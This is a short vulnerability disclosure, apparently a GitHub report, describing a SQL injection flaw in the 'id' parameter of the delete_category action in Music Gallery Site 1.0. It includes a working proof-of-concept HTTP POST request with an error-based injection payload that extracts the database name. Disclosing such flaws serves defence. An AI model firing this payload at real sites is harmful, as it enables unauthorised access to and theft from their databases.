## Music Gallery Site has a front-end SQL injection vulnerability

## Affected version: 
Music Gallery Site - 1.0

## Author:
Liuhaobin

## Software:
https://www.sourcecodester.com/php/16073/music-gallery-site-using-php-and-mysql-database-free-source-code.html

## Vulnerability File:
/php-music/classes/Master.php?f=delete_category

## Description:
Music Gallery Site 1.0 is vulnerable to an unrestricted SQL injection attack in /php-music/classes/Master.php?f=delete_category  with the attack parameter id. An attacker can exploit this vulnerability to directly obtain sensitive server information. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

Status: CRITICAL

POC
```
POST /php-music/classes/Master.php?f=delete_category HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 63
Origin: http://localhost
Connection: close
Referer: http://localhost/php-music/admin/?page=categories
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

id=4%27+and+updatexml(1%2Cconcat(0x7e%2C(database()))%2C3)--+q 
```

<img width="1217" alt="image" src="https://github.com/user-attachments/assets/f314b3cb-c93d-4435-864b-932023bf1910">




